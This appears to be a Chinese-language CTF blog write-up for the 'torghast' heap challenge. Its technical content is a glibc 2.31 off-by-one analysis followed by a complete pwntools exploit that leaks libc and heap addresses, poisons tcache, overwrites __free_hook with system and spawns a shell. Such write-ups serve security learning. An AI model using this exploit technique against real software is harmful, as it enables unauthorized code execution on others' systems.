@@ -1,0 +1,534 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="我他喵的" href="http://example.com/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="我他喵的" href="http://example.com/atom.xml" />
+<link rel="alternate" type="application/json" title="我他喵的" href="http://example.com/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="writeup" />
+
+
+<link rel="canonical" href="http://example.com/2022/05/10/torghast/">
+
+
+
+  <title>
+torghast - pwn |
+dreamcat = 我他喵的</title>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">torghast
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2022-05-10 18:29:08">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2022-05-10T18:29:08+08:00">2022-05-10</time>
+  </span>
+  <span class="item" title="Symbols count in article">
+    <span class="icon">
+      <i class="ic i-pen"></i>
+    </span>
+    <span class="text">Symbols count in article</span>
+    <span>4.1k</span>
+    <span class="text">words</span>
+  </span>
+  <span class="item" title="Reading time">
+    <span class="icon">
+      <i class="ic i-clock"></i>
+    </span>
+    <span class="text">Reading time</span>
+    <span>4 mins.</span>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">dreamcat</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipesx5fdwj20zk0m81kx.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giph47e9vtj20zk0m8x6l.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipesrnqv3j20zk0m8ava.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicmnywqgpj20zk0m8dwx.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicliierfjj20zk0m8npd.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipev1x5e4j20zk0m8b29.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/pwn/" itemprop="item" rel="index" title="In pwn"><span itemprop="name">pwn</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/10/torghast/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="dreamcat">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="我他喵的">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="202205-春秋杯-pwn-torghast"><a class="markdownIt-Anchor" href="#202205-春秋杯-pwn-torghast">#</a> 202205 春秋杯 pwn torghast</h1>
+<h2 id="环境及保护"><a class="markdownIt-Anchor" href="#环境及保护">#</a> 环境及保护</h2>
+<p>2.31 的堆题目</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dreamcat@ubuntu:~/Desktop/chunqiubei/pwn/torghast$ checksec --file=pwn</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE</span><br><span class="line">Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols	  No	0		2		pwn</span><br><span class="line">dreamcat@ubuntu:~/Desktop/chunqiubei/pwn/torghast$</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dreamcat@ubuntu:~/Desktop/chunqiubei/pwn/torghast$ strings libc-2.31.so | grep ubuntu</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.7) stable release version 2.31.</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+<span class="built_in">source</span>/glibc/+bugs&gt;.</span><br><span class="line">dreamcat@ubuntu:~/Desktop/chunqiubei/pwn/torghast$ </span><br></pre></td></tr></table></figure>
+<h2 id="题目分析"><a class="markdownIt-Anchor" href="#题目分析">#</a> 题目分析</h2>
+<h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用">#</a> 漏洞利用</h2>
+<p>我们要想正常做堆题，就必须获得 GM 权限，通过 use magic，造成整数溢出（将 mp 弄成负数），然后闯关，获得 GM 权限</p>
+<p>题目存在空字符的 off-by-one, 但是因为是高版本的 glibc，就导致了修改 chunksize 最低位，触发 unlink 向前合并失效</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这里检查了前 chunk 的 size 与我们释放堆块的 prev_size 是否相等，我 i 们想利用堆块合并构造 overlap 就无效了。一般来说绕过方式是在 chunk 内部伪造一个 chunk, 但是前提是我们可以知道堆地址。</p>
+<p>首先物品们通过 unsortedbins 泄露出 libc 以及 chunksize，就可以后面继续 overlap 了</p>
+<h2 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> exp:</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/dreamcat/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getGM</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Menu&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;GM&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Menu&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;GM&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Menu&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;GM&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Menu&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;GM&quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Welcome&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;get the GM permission!!!&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Menu&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Menu&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Menu&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Menu&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">selectuser</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;User?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manage</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">back</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,text</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Id&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">if</span> size&gt;=<span class="number">1000</span>:</span><br><span class="line">        r.sendafter(<span class="string">&quot;Size&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.sendlineafter(<span class="string">&quot;Size&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&quot;Data&quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,text</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Change&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendafter(<span class="string">&quot;Log&quot;</span>,text)   </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;lete&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    back()</span><br><span class="line">    selectuser(idx)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Menu&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Log:\nXXXXXXXX&quot;</span>)</span><br><span class="line">    addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Menu&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    manage()</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line">getGM()</span><br><span class="line"><span class="comment">#leak the libc</span></span><br><span class="line"><span class="comment">#gdb.attach(r,&#x27;b malloc&#x27;)</span></span><br><span class="line">manage()</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x410</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x420</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x4f0</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x20</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x410</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x4f0</span>,<span class="string">b&#x27;e&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="string">b&#x27;X&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">b&#x27;X&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">libc = show(<span class="number">6</span>)-<span class="number">0x1ecbe0</span></span><br><span class="line">heap = show(<span class="number">5</span>)</span><br><span class="line">malloc_hook=libc +<span class="number">0x1ecb70</span></span><br><span class="line">free_hook =libc + <span class="number">0x1eee48</span></span><br><span class="line">system = libc + <span class="number">0x0522c0</span></span><br><span class="line">onegadget = <span class="number">0xcafebabedeadbeef</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc : &quot;</span>,<span class="built_in">hex</span>(libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap : &quot;</span>,<span class="built_in">hex</span>(heap))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x3f0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0x420</span>))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>)+p64(heap-<span class="number">0x420</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x3e0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x28</span>,<span class="string">b&#x27;x&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">7</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x20</span>,p64(system))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+      <div class="tags">
+          <a href="/tags/writeup/" rel="tag"><i class="ic i-tag"></i> writeup</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2022-05-10 20:57:03" itemprop="dateModified" datetime="2022-05-10T20:57:03+08:00">2022-05-10</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="dreamcat WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="dreamcat Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="dreamcat PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>dreamcat <i class="ic i-at"><em>@</em></i>我他喵的
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="http://example.com/2022/05/10/torghast/" title="torghast">http://example.com/2022/05/10/torghast/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2022/05/10/chunzhiIOT/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipeybxm1pj20zk0m8niv.jpg" title="chunzhiIOT">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> pwn</span>
+  <h3>chunzhiIOT</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2022/05/12/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipetlbztpj20zk0m84qp.jpg" title="滴水逆向_学习笔记">
+  <span class="type">Next Post</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>滴水逆向_学习笔记</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#202205-%E6%98%A5%E7%A7%8B%E6%9D%AF-pwn-torghast"><span class="toc-number">1.</span> <span class="toc-text"> 202205 春秋杯 pwn torghast</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%8A%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.1.</span> <span class="toc-text"> 环境及保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text"> 题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text"> 漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.4.</span> <span class="toc-text"> exp:</span></a></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="Related">
+        <ul>
+          <li><a href="/2022/03/19/pwnable-seethefile/" rel="bookmark" title="pwnable_seethefile">pwnable_seethefile</a></li><li><a href="/2022/03/20/buuoj-heapcreator/" rel="bookmark" title="buuoj_heapcreator">buuoj_heapcreator</a></li><li><a href="/2022/03/21/roarctf-2019-easypwn/" rel="bookmark" title="roarctf_2019_easypwn">roarctf_2019_easypwn</a></li><li><a href="/2022/03/22/tw2017parrot/" rel="bookmark" title="tw2017parrot">tw2017parrot</a></li><li><a href="/2022/04/01/note-file/" rel="bookmark" title="note_file">note_file</a></li><li><a href="/2022/04/01/tcache-tear/" rel="bookmark" title="tcache_tear">tcache_tear</a></li><li><a href="/2022/04/10/pwnable-bookwriter/" rel="bookmark" title=""></a></li><li><a href="/2022/04/14/heap-paradise/" rel="bookmark" title="heap_paradise">heap_paradise</a></li><li><a href="/2022/04/18/starctf_examination/" rel="bookmark" title="examination">examination</a></li><li><a href="/2022/04/19/starctf-babynote/" rel="bookmark" title="starctf_babynote">starctf_babynote</a></li><li><a href="/2022/04/25/MRCTF-ezbash/" rel="bookmark" title="MRCTF_ezbash">MRCTF_ezbash</a></li><li><a href="/2022/05/10/chunzhiIOT/" rel="bookmark" title="chunzhiIOT">chunzhiIOT</a></li><li class="active"><a href="/2022/05/10/torghast/" rel="bookmark" title="torghast">torghast</a></li><li><a href="/2022/05/13/pwnable-re-alloc/" rel="bookmark" title="pwnable-re-alloc">pwnable-re-alloc</a></li><li><a href="/2022/06/18/ciscn2022-syscall/" rel="bookmark" title="ciscn2022_syscall">ciscn2022_syscall</a></li><li><a href="/2022/06/19/ciscn-2022-popcalc/" rel="bookmark" title="ciscn_2022_popcalc">ciscn_2022_popcalc</a></li><li><a href="/2022/06/20/ciscn-2022-planecoode/" rel="bookmark" title="ciscn_2022_planecoode">ciscn_2022_planecoode</a></li><li><a href="/2022/09/20/tctf2022ezvm/" rel="bookmark" title="tctf2022ezvm">tctf2022ezvm</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="dreamcat"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">dreamcat</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">33</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">4</span>
+        <span class="name">categories</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">8</span>
+        <span class="name">tags</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2022/05/10/chunzhiIOT/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2022/05/12/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/05/12/%E9%80%86%E5%90%91%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/" title="逆向常见算法">逆向常见算法</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/08/01/glibc-2-35%E4%B8%80%E4%BA%9B%E6%89%8B%E6%B3%95/" title="glibc-2.35一些手法">glibc-2.35一些手法</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/06/21/ciscn-2022-whatheap/" title="ciscn_2022_whatheap">ciscn_2022_whatheap</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/04/19/starctf-babynote/" title="starctf_babynote">starctf_babynote</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/04/14/heap-paradise/" title="heap_paradise">heap_paradise</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/03/20/buuoj-heapcreator/" title="buuoj_heapcreator">buuoj_heapcreator</a></span>
+  </li>
+
+      
+  <li class="item">
+    
